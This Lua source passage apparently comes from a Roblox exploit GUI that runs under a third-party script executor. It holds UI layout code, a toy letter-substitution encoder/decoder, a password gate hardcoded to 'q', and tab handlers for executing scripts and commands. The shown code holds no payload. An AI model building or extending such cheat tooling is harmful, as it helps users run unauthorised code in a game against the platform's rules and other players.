box["noxsec encoder and decoder input text padding"] = Instance.new("UIPadding")
box["noxsec encoder and decoder input text padding"].PaddingBottom = UDim.new(0, 4)
box["noxsec encoder and decoder input text padding"].PaddingLeft = UDim.new(0, 4)
box["noxsec encoder and decoder input text padding"].PaddingRight = UDim.new(0, 4)
box["noxsec encoder and decoder input text padding"].PaddingTop = UDim.new(0, 4)
box["noxsec encoder and decoder input text padding"].Parent = box["noxsec encoder and decoder input"]

box["noxsec encode"].Size = UDim2.new(0, 160, 0, 41)
box["noxsec encode"].Position = UDim2.new(0, 4, 0, 197)

box["noxsec encode"].BackgroundColor3 = box["default background color"]

box["noxsec encode"].BorderColor3 = box["default border color"]
box["noxsec encode"].BorderSizePixel = 1

box["noxsec encode"].Parent = box["noxsec encoder and decoder tab main frame 1"]
box["noxsec encode"].ZIndex = 803

box["noxsec encode"].Font = Enum.Font.RobotoMono
box["noxsec encode"].TextColor3 = Color3.new(1, 1, 1)
box["noxsec encode"].TextSize = 15
box["noxsec encode"].Text = "encode"
box["noxsec encode"].TextWrapped = true
box["noxsec encode"].TextXAlignment = Enum.TextXAlignment.Center
box["noxsec encode"].TextYAlignment = Enum.TextYAlignment.Center
box["noxsec encode"].ClipsDescendants = true

box["noxsec encode text padding"] = Instance.new("UIPadding")
box["noxsec encode text padding"].PaddingBottom = UDim.new(0, 0)
box["noxsec encode text padding"].Parent = box["reverse message"]

box["noxsec decode"].Size = UDim2.new(0, 160, 0, 41)
box["noxsec decode"].Position = UDim2.new(0, 169, 0, 197)

box["noxsec decode"].BackgroundColor3 = box["default background color"]

box["noxsec decode"].BorderColor3 = box["default border color"]
box["noxsec decode"].BorderSizePixel = 1

box["noxsec decode"].Parent = box["noxsec encoder and decoder tab main frame 1"]
box["noxsec decode"].ZIndex = 803

box["noxsec decode"].Font = Enum.Font.RobotoMono
box["noxsec decode"].TextColor3 = Color3.new(1, 1, 1)
box["noxsec decode"].TextSize = 15
box["noxsec decode"].Text = "decode"
box["noxsec decode"].TextWrapped = true
box["noxsec decode"].TextXAlignment = Enum.TextXAlignment.Center
box["noxsec decode"].TextYAlignment = Enum.TextYAlignment.Center
box["noxsec decode"].ClipsDescendants = true

box["noxsec decode text padding"] = Instance.new("UIPadding")
box["noxsec decode text padding"].PaddingBottom = UDim.new(0, 0)
box["noxsec decode text padding"].Parent = box["reverse message"]

box["clear noxsec encoder and decoder input"].Size = UDim2.new(0, 101, 0, 41)
box["clear noxsec encoder and decoder input"].Position = UDim2.new(0, 334, 0, 197)

box["clear noxsec encoder and decoder input"].BackgroundColor3 = box["default background color"]

box["clear noxsec encoder and decoder input"].BorderColor3 = box["default border color"]
box["clear noxsec encoder and decoder input"].BorderSizePixel = 1

box["clear noxsec encoder and decoder input"].Parent = box["noxsec encoder and decoder tab main frame 1"]
box["clear noxsec encoder and decoder input"].ZIndex = 803

box["clear noxsec encoder and decoder input"].Font = Enum.Font.RobotoMono
box["clear noxsec encoder and decoder input"].TextColor3 = Color3.new(1, 1, 1)
box["clear noxsec encoder and decoder input"].TextSize = 15
box["clear noxsec encoder and decoder input"].Text = "clear"
box["clear noxsec encoder and decoder input"].TextWrapped = true
box["clear noxsec encoder and decoder input"].TextXAlignment = Enum.TextXAlignment.Center
box["clear noxsec encoder and decoder input"].TextYAlignment = Enum.TextYAlignment.Center
box["clear noxsec encoder and decoder input"].ClipsDescendants = true

box["clear noxsec encoder and decoder input text padding"] = Instance.new("UIPadding")
box["clear noxsec encoder and decoder input text padding"].PaddingBottom = UDim.new(0, 0)
box["clear noxsec encoder and decoder input text padding"].Parent = box["clear noxsec encoder and decoder input"]

box["copy noxsec encoder and decoder input"].Size = UDim2.new(0, 101, 0, 41)
box["copy noxsec encoder and decoder input"].Position = UDim2.new(0, 440, 0, 197)

box["copy noxsec encoder and decoder input"].BackgroundColor3 = box["default background color"]

box["copy noxsec encoder and decoder input"].BorderColor3 = box["default border color"]
box["copy noxsec encoder and decoder input"].BorderSizePixel = 1

box["copy noxsec encoder and decoder input"].Parent = box["noxsec encoder and decoder tab main frame 1"]
box["copy noxsec encoder and decoder input"].ZIndex = 803

box["copy noxsec encoder and decoder input"].Font = Enum.Font.RobotoMono
box["copy noxsec encoder and decoder input"].TextColor3 = Color3.new(1, 1, 1)
box["copy noxsec encoder and decoder input"].TextSize = 15
box["copy noxsec encoder and decoder input"].Text = "copy"
box["copy noxsec encoder and decoder input"].TextWrapped = true
box["copy noxsec encoder and decoder input"].TextXAlignment = Enum.TextXAlignment.Center
box["copy noxsec encoder and decoder input"].TextYAlignment = Enum.TextYAlignment.Center
box["copy noxsec encoder and decoder input"].ClipsDescendants = true

box["copy noxsec encoder and decoder input text padding"] = Instance.new("UIPadding")
box["copy noxsec encoder and decoder input text padding"].PaddingBottom = UDim.new(0, 0)
box["copy noxsec encoder and decoder input text padding"].Parent = box["copy noxsec encoder and decoder input"]

function charToA1Z26(c)
	if c == " " then
		return "00", false
	end
	local isUpper = c:match("%u") ~= nil
	local byte = string.byte(c:upper())
	if byte >= 65 and byte <= 90 then
		local index = byte - 64
		return (index < 10 and "0" or "") .. tostring(index), isUpper
	else
		return "", false
	end
end

function reverseStr(str)
	return string.reverse(str)
end

local MULTIPLIER = 51

function padTwoDigits(num)
	num = num % 100
	return (num < 10 and "0" or "") .. tostring(num)
end

function encodeInput(input)
	local encodedParts = {}

	for i = 1, #input do
		local c = input:sub(i, i)
		local a1z26, isUpper = charToA1Z26(c)
		if a1z26 ~= "" then
			local reversed = reverseStr(a1z26)
			local multiplied = (tonumber(reversed) * MULTIPLIER) % 100

			if isUpper then
				multiplied = (multiplied + 3) % 100
			end

			local encodedStr = padTwoDigits(multiplied)
			table.insert(encodedParts, encodedStr)
		end
	end

	local reversedOutput = {}
	for i = #encodedParts, 1, -1 do
		reversedOutput[i] = "x" .. encodedParts[i] .. "."
	end

	local result = table.concat(reversedOutput)
	if result:sub(-1) == "." then
		result = result:sub(1, -2)
	end
	return result
end

function decodeInput(encoded)
	local decodedParts = {}

	for numStr in encoded:gmatch("x(%d%d)") do
		table.insert(decodedParts, numStr)
	end

	local reversed = {}
	for i = #decodedParts, 1, -1 do
		table.insert(reversed, decodedParts[i])
	end

	local result = {}

	for _, numStr in ipairs(reversed) do
		local num = tonumber(numStr)

		local possible = {
			{val = (num - 3) % 100, upper = true},
			{val = num, upper = false}
		}

		local found = false
		for _, attempt in ipairs(possible) do
			local inv = (attempt.val * MULTIPLIER) % 100
			local invStr = padTwoDigits(inv)
			local originalReversed = reverseStr(invStr)
			local val = tonumber(originalReversed)

			if val == 0 then
				table.insert(result, " ")
				found = true
				break
			elseif val >= 1 and val <= 26 then
				local char = string.char(val + 64)
				if not attempt.upper then
					char = char:lower()
				end
				table.insert(result, char)
				found = true
				break
			end
		end

		if not found then
			table.insert(result, "?")
		end
	end

	local decodedString = table.concat(result)
	return string.reverse(decodedString)
end

box["clear noxsec encoder and decoder input"].MouseButton1Click:Connect(function()
	playclicksound()
	box["noxsec encoder and decoder input"].Text = ""
end)

box["copy noxsec encoder and decoder input"].MouseButton1Click:Connect(function()
	playclicksound()
	local everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)

	local function copytoclipboard(txt)
		if everyClipboard then
			everyClipboard(tostring(txt))
			unablenotify("copied to clipboard.")
		else
			unablenotify("unable to access clipboard.")
		end
	end
	copytoclipboard(box["noxsec encoder and decoder input"].Text)
end)

box["noxsec encode"].MouseButton1Click:Connect(function()
	playclicksound()
	box["noxsec encoder and decoder input"].Text = encodeInput(box["noxsec encoder and decoder input"].Text)
end)

box["noxsec decode"].MouseButton1Click:Connect(function()
	playclicksound()
	box["noxsec encoder and decoder input"].Text = decodeInput(box["noxsec encoder and decoder input"].Text)
end)

-------------------------------------------------------------------------------------------------------------------------------

box["noxsec encoder and decoder tab block main frame"].Size = UDim2.new(0, 575, 0, 268)
box["noxsec encoder and decoder tab block main frame"].Position = UDim2.new(0, 0, 1, 1)

box["noxsec encoder and decoder tab block main frame"].BackgroundColor3 = box["default background color"]

box["noxsec encoder and decoder tab block main frame"].BorderColor3 = box["default border color"]
box["noxsec encoder and decoder tab block main frame"].BorderSizePixel = 1
box["noxsec encoder and decoder tab block main frame"].BackgroundTransparency = 1

box["noxsec encoder and decoder tab block main frame"].Parent = box["noxsec encoder and decoder tab top bar"]
box["noxsec encoder and decoder tab block main frame"].ZIndex = 804
box["noxsec encoder and decoder tab block main frame"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

box["noxsec encoder and decoder tab block all"].Size = UDim2.new(0, 545, 0, 270)
box["noxsec encoder and decoder tab block all"].Position = UDim2.new(0, 0, 0, 0)

box["noxsec encoder and decoder tab block all"].BackgroundColor3 = box["default background color"]

box["noxsec encoder and decoder tab block all"].BorderColor3 = box["default border color"]
box["noxsec encoder and decoder tab block all"].BorderSizePixel = 1
box["noxsec encoder and decoder tab block all"].BackgroundTransparency = 0

box["noxsec encoder and decoder tab block all"].Parent = box["noxsec encoder and decoder tab top bar"]
box["noxsec encoder and decoder tab block all"].ZIndex = 805
box["noxsec encoder and decoder tab block all"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

box["top bar close button"].Size = UDim2.new(0, 18, 0, 18)
box["top bar close button"].Position = UDim2.new(0, 379, 0, 4.7)

box["top bar close button"].BackgroundColor3 = box["default background color"]

box["top bar close button"].BorderColor3 = box["default border color"]
box["top bar close button"].BorderSizePixel = 1

box["top bar close button"].TextColor3 = box["default border color"]
box["top bar close button"].Font = Enum.Font.RobotoMono
box["top bar close button"].TextSize = 16
box["top bar close button"].TextScaled = false
box["top bar close button"].Text = "X"
box["top bar close button"].TextXAlignment = Enum.TextXAlignment.Center
box["top bar close button"].TextYAlignment = Enum.TextYAlignment.Center

box["top bar close button"].Parent = box["top bar"]
box["top bar close button"].ZIndex = 20

box["top bar close button text padding"] = Instance.new("UIPadding")
box["top bar close button text padding"].PaddingTop = UDim.new(0, -1)
box["top bar close button text padding"].Parent = box["top bar close button"]

box["top bar close button"].MouseButton1Click:Connect(function()
	if not canpress then return end
	playclicksound()

	box["top bar"].Visible = not box["top bar"].Visible

	if box["top bar"].Visible then
		if minimized then return end
		canpress = false
		local tweens = {}
		for name, offset in pairs(showOffsets) do
			local smallButton = box[name]
			smallButton.Visible = true
			if box["unlocked"] == false then canpress = true end
			local targetPosition = originalPositions[name] + offset
			local targetRotation = 0
			local tween = tweenPositionAndRotation(smallButton, targetPosition, targetRotation, 0.5)
			table.insert(tweens, tween)
		end
	else
		if minimized then return end
		canpress = false
		for name, _ in pairs(showOffsets) do
			randomRotations[name] = getRandomRotation()
		end

		local tweens = {}
		for name, _ in pairs(showOffsets) do
			local smallButton = box[name]
			if box["unlocked"] == false then canpress = true end
			local targetPosition = originalPositions[name]
			local targetRotation = randomRotations[name]
			local tween = tweenPositionAndRotation(smallButton, targetPosition, targetRotation, 0.5)
			tween.Completed:Connect(function()
				smallButton.Visible = false
			end)
			table.insert(tweens, tween)
		end

		for _, tween in ipairs(tweens) do
			tween.Completed:Wait() canpress = true
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

box["top bar minimize button"].Size = UDim2.new(0, 18, 0, 18)
box["top bar minimize button"].Position = UDim2.new(0, 355, 0, 4.7)

box["top bar minimize button"].BackgroundColor3 = box["default background color"]

box["top bar minimize button"].BorderColor3 = box["default border color"]
box["top bar minimize button"].BorderSizePixel = 1

box["top bar minimize button"].TextColor3 = box["default border color"]
box["top bar minimize button"].Font = Enum.Font.RobotoMono
box["top bar minimize button"].TextSize = 16
box["top bar minimize button"].TextScaled = false
box["top bar minimize button"].Visible = false
box["top bar minimize button"].Text = "-"
box["top bar minimize button"].TextXAlignment = Enum.TextXAlignment.Center
box["top bar minimize button"].TextYAlignment = Enum.TextYAlignment.Center

box["top bar minimize button"].Parent = box["top bar"]
box["top bar minimize button"].ZIndex = 20

box["top bar minimize button text padding"] = Instance.new("UIPadding")
box["top bar minimize button text padding"].PaddingTop = UDim.new(0, -2)
box["top bar minimize button text padding"].Parent = box["top bar minimize button"]

canminimize = true

function fade(object, targetTransparency, duration)
	local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
	local tween = box["tween service"]:Create(object, tweenInfo, {BackgroundTransparency = targetTransparency})
	tween:Play()
	return tween
end

function tweenSizePosition(object, targetSize, targetPosition, duration)
	local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
	local tween = box["tween service"]:Create(object, tweenInfo, {Size = targetSize, Position = targetPosition})
	tween:Play()
	return tween
end

box["top bar minimize button"].MouseButton1Click:Connect(function()
	if not canminimize then return end
	canpress = false
	canpress2 = false
	playclicksound()

	minimized = not minimized
	canminimize = false

	if minimized then
		box["top bar minimize button"].Text = "+"

		spawn(function()
			for name, _ in pairs(showOffsets) do
				randomRotations[name] = getRandomRotation()
			end

			local tweens = {}
			for name, _ in pairs(showOffsets) do
				local smallButton = box[name]
				local targetPosition = originalPositions[name]
				local targetRotation = randomRotations[name]
				local tween = tweenPositionAndRotation(smallButton, targetPosition, targetRotation, 0.5)
				tween.Completed:Connect(function()
					smallButton.Visible = false
				end)
				table.insert(tweens, tween)
			end
			for _, tween in ipairs(tweens) do
				tween.Completed:Wait()
			end
		end)

		box["block main frame"].BackgroundTransparency = 1
		box["block main frame"].Visible = true
		local fadeTween = fade(box["block main frame"], 0, 0.2)

		fadeTween.Completed:Wait()

		box["main frame 1"].Visible = false
		box["main frame 2"].Visible = false
		box["main frame 3"].Visible = false
		box["main frame 4"].Visible = false
		box["password frame"].Visible = false

		local tween = tweenSizePosition(box["block main frame"], UDim2.new(0, 401, 0, 0), UDim2.new(0, 0, 1, 1), 0.5)

		tween.Completed:Wait()

		box["block main frame"].Visible = false
		box["emoticon"] = ">.<"
		local old = box["top bar"].Text:gsub("[%s]*[>%.o<]+$", "")
		box["top bar"].Text = old .. " " .. box["emoticon"]
	else
		spawn(function()
			local tweens = {}
			for name, offset in pairs(showOffsets) do
				local smallButton = box[name]
				smallButton.Visible = true
				local targetPosition = originalPositions[name] + offset
				local targetRotation = 0
				local tween = tweenPositionAndRotation(smallButton, targetPosition, targetRotation, 0.5)
				table.insert(tweens, tween)
			end
			for _, tween in ipairs(tweens) do
				tween.Completed:Wait()
			end
		end)

		box["top bar minimize button"].Text = "-"

		box["block main frame"].Visible = true
		local tween = tweenSizePosition(box["block main frame"], UDim2.new(0, 401, 0, 249), UDim2.new(0, 0, 1, 1), 0.5)

		tween.Completed:Wait()

		if box["unlocked"] == true then
			box["password frame"].Visible = false
		else
			box["password frame"].Visible = true
		end
		box[lastVisibleFrame].Visible = true

		local fadeTween = fade(box["block main frame"], 1, 0.2)

		fadeTween.Completed:Wait()

		box["block main frame"].Visible = false
		box["emoticon"] = "o.o"
		local old = box["top bar"].Text:gsub("[%s]*[>%.o<]+$", "")
		box["top bar"].Text = old .. " " .. box["emoticon"]
	end

	canminimize = true
	canpress2 = true
	canpress = true
end)

-------------------------------------------------------------------------------------------------------------------------------

box["top bar reposition button"].Size = UDim2.new(0, 18, 0, 18)
box["top bar reposition button"].Position = UDim2.new(0, 355, 0, 4.7)

box["top bar reposition button"].BackgroundColor3 = box["default background color"]

box["top bar reposition button"].BorderColor3 = box["default border color"]
box["top bar reposition button"].BorderSizePixel = 1

box["top bar reposition button"].TextColor3 = box["default border color"]
box["top bar reposition button"].Font = Enum.Font.RobotoMono
box["top bar reposition button"].TextSize = 16
box["top bar reposition button"].TextScaled = false
box["top bar reposition button"].Text = "R"
box["top bar reposition button"].TextXAlignment = Enum.TextXAlignment.Center
box["top bar reposition button"].TextYAlignment = Enum.TextYAlignment.Center

box["top bar reposition button"].Parent = box["top bar"]
box["top bar reposition button"].ZIndex = 21

box["top bar reposition button text padding"] = Instance.new("UIPadding")
box["top bar reposition button text padding"].PaddingTop = UDim.new(0, -1)
box["top bar reposition button text padding"].Parent = box["top bar reposition button"]

box["top bar reposition button"].MouseButton1Click:Connect(function()
	playclicksound()
	repos(box["top bar"], 0.5, 401, 250 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

box["main frame 1"].Size = UDim2.new(0, 401, 0, 250)
box["main frame 1"].Position = UDim2.new(0, 0, 1, 0)

box["main frame 1"].BackgroundColor3 = box["default background color"]

box["main frame 1"].BorderColor3 = box["default border color"]
box["main frame 1"].BorderSizePixel = 1

box["main frame 1"].Parent = box["top bar"]
box["main frame 1"].ZIndex = 18

-------------------------------------------------------------------------------------------------------------------------------

box["main frame 2"].Size = UDim2.new(0, 401, 0, 249)
box["main frame 2"].Position = UDim2.new(0, 0, 1, 1)

box["main frame 2"].BackgroundColor3 = box["default background color"]

box["main frame 2"].BorderColor3 = box["default border color"]
box["main frame 2"].BorderSizePixel = 1

box["main frame 2"].Parent = box["top bar"]
box["main frame 2"].ZIndex = 20
box["main frame 2"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

box["main frame 3"].Size = UDim2.new(0, 401, 0, 249)
box["main frame 3"].Position = UDim2.new(0, 0, 1, 1)

box["main frame 3"].BackgroundColor3 = box["default background color"]

box["main frame 3"].BorderColor3 = box["default border color"]
box["main frame 3"].BorderSizePixel = 1

box["main frame 3"].Parent = box["top bar"]
box["main frame 3"].ZIndex = 22
box["main frame 3"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

box["main frame 4"].Size = UDim2.new(0, 401, 0, 249)
box["main frame 4"].Position = UDim2.new(0, 0, 1, 1)

box["main frame 4"].BackgroundColor3 = box["default background color"]

box["main frame 4"].BorderColor3 = box["default border color"]
box["main frame 4"].BorderSizePixel = 1

box["main frame 4"].Parent = box["top bar"]
box["main frame 4"].ZIndex = 24
box["main frame 4"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

box["block main frame"].Size = UDim2.new(0, 401, 0, 249)
box["block main frame"].Position = UDim2.new(0, 0, 1, 1)

box["block main frame"].BackgroundColor3 = box["default background color"]

box["block main frame"].BorderColor3 = box["default border color"]
box["block main frame"].BorderSizePixel = 1

box["block main frame"].Parent = box["top bar"]
box["block main frame"].ZIndex = 48
box["block main frame"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

box["password frame"].Size = UDim2.new(0, 401, 0, 249)
box["password frame"].Position = UDim2.new(0, 0, 1, 1)

box["password frame"].BackgroundColor3 = box["default background color"]

box["password frame"].BorderColor3 = box["default border color"]
box["password frame"].BorderSizePixel = 1

box["password frame"].Parent = box["top bar"]
box["password frame"].ZIndex = 45
box["password frame"].Visible = true

-------------------------------------------------------------------------------------------------------------------------------

box["password text"].Size = UDim2.new(0, 393, 0, 241)
box["password text"].Position = UDim2.new(0, 4, 0, 4)
box["password text"].BackgroundColor3 = box["default background color"]
box["password text"].BorderColor3 = box["default border color"]
box["password text"].BackgroundTransparency = 0
box["password text"].BorderSizePixel = 1
box["password text"].Parent = box["password frame"]
box["password text"].Visible = true

box["password text"].TextColor3 = box["default border color"]
box["password text"].Font = Enum.Font.RobotoMono
box["password text"].TextSize = 15
box["password text"].TextScaled = false
box["password text"].Text = ""
box["password text"].TextXAlignment = Enum.TextXAlignment.Center
box["password text"].TextYAlignment = Enum.TextYAlignment.Center
box["password text"].ZIndex = 45

box["password text padding"] = Instance.new("UIPadding")
box["password text padding"].PaddingBottom = UDim.new(0, 9)
box["password text padding"].Parent = box["password text"]

-------------------------------------------------------------------------------------------------------------------------------

box["password label"] = Instance.new("TextLabel")
box["password label"].Size = UDim2.new(0, 250, 0, 30)
box["password label"].AnchorPoint = Vector2.new(0.5, 0.5)
box["password label"].BackgroundTransparency = 0
box["password label"].BorderSizePixel = 0
box["password label"].TextColor3 = box["default border color"]
box["password label"].Font = Enum.Font.RobotoMono
box["password label"].TextSize = 15
box["password label"].Text = "enter password"
box["password label"].TextXAlignment = Enum.TextXAlignment.Center
box["password label"].TextYAlignment = Enum.TextYAlignment.Center
box["password label"].ZIndex = 46
box["password label"].Parent = box["password text"]

-------------------------------------------------------------------------------------------------------------------------------

box["password box"].Size = UDim2.new(0, 250, 0, 30)
box["password box"].AnchorPoint = Vector2.new(0.5, 0.5)
box["password box"].BackgroundColor3 = box["default background color"]
box["password box"].BorderColor3 = box["default border color"]
box["password box"].BackgroundTransparency = 0
box["password box"].BorderSizePixel = 0
box["password box"].Parent = box["password text"]
box["password box"].Visible = true

box["password box"].TextColor3 = box["default background color"]
box["password box"].PlaceholderColor3 = box["default 1/2 color"]
box["password box"].Font = Enum.Font.RobotoMono
box["password box"].TextTransparency = 1
box["password box"].TextSize = 15
box["password box"].Name = "fakebox"
box["password box"].TextScaled = false
box["password box"].PlaceholderText = ""
box["password box"].Text = ""
box["password box"].TextXAlignment = Enum.TextXAlignment.Center
box["password box"].TextYAlignment = Enum.TextYAlignment.Center
box["password box"].ZIndex = 46
box["password box"].ClipsDescendants = true

box["password box padding"] = Instance.new("UIPadding")
box["password box padding"].PaddingBottom = UDim.new(0, 2)
box["password box padding"].Parent = box["password box"]

-------------------------------------------------------------------------------------------------------------------------------

cancheck = true

box["password check button"] = Instance.new("TextButton")
box["password check button"].Size = UDim2.new(0, 250, 0, 30)
box["password check button"].BackgroundColor3 = box["default border color"]
box["password check button"].AnchorPoint = Vector2.new(0.5, 0)
box["password check button"].TextColor3 = Color3.new(1, 1, 1)
box["password check button"].Font = Enum.Font.Nunito
box["password check button"].TextSize = 15
box["password check button"].Text = "check"
box["password check button"].Parent = box["password text"]
box["password check button"].ZIndex = 48

box["password check padding"] = Instance.new("UIPadding")
box["password check padding"].PaddingBottom = UDim.new(0, 2)
box["password check padding"].Parent = box["password check"]

-------------------------------------------------------------------------------------------------------------------------------

box["pw"] = "q"
box["lmao"] = false
box["typing"] = false
box["typed"] = false
box["cv"] = true

box["password bullet label"] = Instance.new("TextLabel")
box["password bullet label"].Name = "fakebox"
box["password bullet label"].AnchorPoint = Vector2.new(0.5, 0.5)
box["password bullet label"].Size = UDim2.new(0, 250, 0, 30)
box["password bullet label"].BackgroundTransparency = 0
box["password bullet label"].TextColor3 = box["default text color"]
box["password bullet label"].Font = Enum.Font.Nunito
box["password bullet label"].TextSize = 15
box["password bullet label"].TextScaled = false
box["password bullet label"].TextXAlignment = Enum.TextXAlignment.Center
box["password bullet label"].TextYAlignment = Enum.TextYAlignment.Center
box["password bullet label"].ZIndex = 47
box["password bullet label"].Text = "enter password"
box["password bullet label"].TextTransparency = 0
box["password bullet label"].Parent = box["password text"]
box["password bullet label"].ClipsDescendants = true

box["password bullet label padding"] = Instance.new("UIPadding")
box["password bullet label padding"].PaddingBottom = UDim.new(0, 2)
box["password bullet label padding"].Parent = box["password bullet label"]

box["password fake cursor"] = Instance.new("TextLabel")
box["password fake cursor"].AnchorPoint = Vector2.new(0.5, 0.5)
box["password fake cursor"].Size = UDim2.new(0, 250, 0, 30)
box["password fake cursor"].BackgroundTransparency = 1
box["password fake cursor"].TextColor3 = box["default 1/2 color"]
box["password fake cursor"].Font = Enum.Font.Nunito
box["password fake cursor"].TextSize = 15
box["password fake cursor"].TextScaled = false
box["password fake cursor"].TextXAlignment = Enum.TextXAlignment.Center
box["password fake cursor"].TextYAlignment = Enum.TextYAlignment.Center
box["password fake cursor"].ZIndex = 48
box["password fake cursor"].Text = ""
box["password fake cursor"].TextTransparency = 0
box["password fake cursor"].Parent = box["password text"]
box["password fake cursor"].ClipsDescendants = true

box["password fake cursor padding"] = Instance.new("UIPadding")
box["password fake cursor padding"].PaddingBottom = UDim.new(0, 2)
box["password fake cursor padding"].Parent = box["password fake cursor"]

box["password label"].Position = UDim2.new(0.5, 0, 0.5, - 13 - (18 + 17))
box["password box"].Position = UDim2.new(0.5, 0, 0.5, 22 - (18 + 17))
box["password check button"].Position = UDim2.new(0.5, 0, 0.5, 42 - (18 + 17))
box["password bullet label"].Position = UDim2.new(0.5, 0, 0.5, 22 - (18 + 17))
box["password fake cursor"].Position = UDim2.new(0.5, 0, 0.5, 22 - (18 + 17))

box["max chars"] = 30

local function updbl()
	if #box["password box"].Text > box["max chars"] then
		box["password box"].Text = box["password box"].Text:sub(1, box["max chars"])
	end

	local textLen = #box["password box"].Text
	local hasText = textLen > 0

	if hasText then
		box["password bullet label"].Text = string.rep("•", textLen)
		box["password bullet label"].TextColor3 = box["default text color"]
	else
		box["password bullet label"].Text = "enter password"
		box["password bullet label"].TextColor3 = box["default 1/2 color"]
	end

	local spaces = string.rep(" ", textLen)
	if box["typing"] then
		box["password fake cursor"].Text = spaces .. (box["cv"] and " " or "│")
	else
		box["password fake cursor"].Text = spaces
	end
end

local function srcb()
	box["typing"] = true
	while box["typing"] do
		box["cv"] = not box["cv"]
		updbl()
		wait(0.3)
	end
end

local function stcb()
	box["typing"] = false
	updbl()
end

box["password box"]:GetPropertyChangedSignal("Text"):Connect(updbl)

box["password box"].Focused:Connect(function()
	box["password bullet label"].TextTransparency = 0
	updbl()
	srcb()
end)

box["password box"].FocusLost:Connect(function()
	stcb()
	box["typed"] = true
end)

box["asset ids tab"].Visible = false
box["commands tab"].Visible = false
box["scripts tab"].Visible = false
box["executor tab"].Visible = false
box["introduction"].Visible = false

local entered = Instance.new("Sound")
entered.SoundId = "rbxassetid://8458409341"
entered.Parent = box["local player"]
entered.Name = "canttouchthis"
entered.Volume = 0
entered.TimePosition = 0
spawn(function() entered:Play() end)

local function checkpass()
	playclicksound()
	stcb()
	if cancheck == true then
		cancheck = false
		if box["password box"].Text == box["pw"] then canpress = false
			entered.Volume = 1
			spawn(function() entered:Play() end)
			box["unlocked"] = true
			box["password label"].Text = "correct password"
			spawn(function() unablenotify("welcome to boxten sex gui v" .. box["version"] .. ".") end)

			spawn(function()
				if not box["unlocked"] then return end
				local tweens = {}
				for name, offset in pairs(showOffsets) do
					local smallButton = box[name]
					smallButton.Visible = true
					local targetPosition = originalPositions[name] + offset
					local targetRotation = 0
					local tween = tweenPositionAndRotation(smallButton, targetPosition, targetRotation, 0.5)
					table.insert(tweens, tween)
				end
				for _, tween in ipairs(tweens) do
					tween.Completed:Wait()
				end
			end)

			spawn(function()
				box["asset ids tab"].Visible = true
				box["commands tab"].Visible = true
				box["scripts tab"].Visible = true
				box["executor tab"].Visible = true
				box["introduction"].Visible = true

				box["executor tab"].MouseButton1Click:Connect(function()
					playclicksound()

					box["scripts tab bottom cover"].Visible = false
					box["commands tab bottom cover"].Visible = false
					box["asset ids tab bottom cover"].Visible = false
					box["executor tab bottom cover"].Visible = true

					box["executor scrolling frame"].Visible = true
					box["execute button"].Visible = true
					box["execute from client button"].Visible = true
					box["clear button"].Visible = true

					box["next page"].Visible = false
					box["previous page"].Visible = false
					box["button holder"].Visible = false 
					box["script search bar"].Visible = false

					box["list of commands"].Visible = false
					box["command bar"].Visible = false
					box["execute command button"].Visible = false

					box["asset id type indicator"].Visible = false
					box["asset id search bar"].Visible = false
					box["next page 2 button"].Visible = false
					box["previous page 2 button"].Visible = false
					box["switch asset id type button"].Visible = false
					box["switch asset id type button 2"].Visible = false

					box["introduction"]:Destroy()

					box["copy asset id 3 button"].Visible = false
					box["asset image id 3"].Visible = false
					box["asset image name 3"].Visible = false
					box["asset image 3"].Visible = false
					box["copy asset id 2 button"].Visible = false
					box["asset image id 2"].Visible = false
					box["asset image name 2"].Visible = false
					box["asset image 2"].Visible = false
					box["copy asset id 1 button"].Visible = false
					box["asset image id 1"].Visible = false
					box["asset image name 1"].Visible = false
					box["asset image 1"].Visible = false
				end)

				box["scripts tab"].MouseButton1Click:Connect(function()
					playclicksound()

					box["scripts tab bottom cover"].Visible = true
					box["commands tab bottom cover"].Visible = false
					box["asset ids tab bottom cover"].Visible = false
					box["executor tab bottom cover"].Visible = false

					box["executor scrolling frame"].Visible = false
					box["execute button"].Visible = false
					box["execute from client button"].Visible = false
					box["clear button"].Visible = false
					box["list of commands"].Visible = false
					box["command bar"].Visible = false
					box["execute command button"].Visible = false
					box["asset id type indicator"].Visible = false
					box["asset id search bar"].Visible = false
					box["next page 2 button"].Visible = false
					box["previous page 2 button"].Visible = false
					box["switch asset id type button"].Visible = false
					box["switch asset id type button 2"].Visible = false
					if box["introduction"] then
						box["introduction"]:Destroy()
					end

					box["copy asset id 3 button"].Visible = false
					box["asset image id 3"].Visible = false
					box["asset image name 3"].Visible = false
					box["asset image 3"].Visible = false
					box["copy asset id 2 button"].Visible = false
					box["asset image id 2"].Visible = false
					box["asset image name 2"].Visible = false
					box["asset image 2"].Visible = false
					box["copy asset id 1 button"].Visible = false
					box["asset image id 1"].Visible = false
					box["asset image name 1"].Visible = false
					box["asset image 1"].Visible = false

					showScriptPage() 
					box["script search bar"].Visible = true
				end)

				box["commands tab"].MouseButton1Click:Connect(function()
					playclicksound()

					box["scripts tab bottom cover"].Visible = false
					box["commands tab bottom cover"].Visible = true
					box["asset ids tab bottom cover"].Visible = false
					box["executor tab bottom cover"].Visible = false

					box["executor scrolling frame"].Visible = false
					box["execute button"].Visible = false
					box["execute from client button"].Visible = false
					box["clear button"].Visible = false

					box["next page"].Visible = false
					box["previous page"].Visible = false
					box["button holder"].Visible = false
					box["script search bar"].Visible = false

					box["list of commands"].Visible = true
					box["command bar"].Visible = true
					box["execute command button"].Visible = true

					box["asset id type indicator"].Visible = false
					box["asset id search bar"].Visible = false
					box["next page 2 button"].Visible = false
					box["previous page 2 button"].Visible = false
					box["switch asset id type button"].Visible = false
					box["switch asset id type button 2"].Visible = false

					box["introduction"]:Destroy()

					box["copy asset id 3 button"].Visible = false
					box["asset image id 3"].Visible = false
					box["asset image name 3"].Visible = false
					box["asset image 3"].Visible = false
					box["copy asset id 2 button"].Visible = false
					box["asset image id 2"].Visible = false
					box["asset image name 2"].Visible = false
					box["asset image 2"].Visible = false
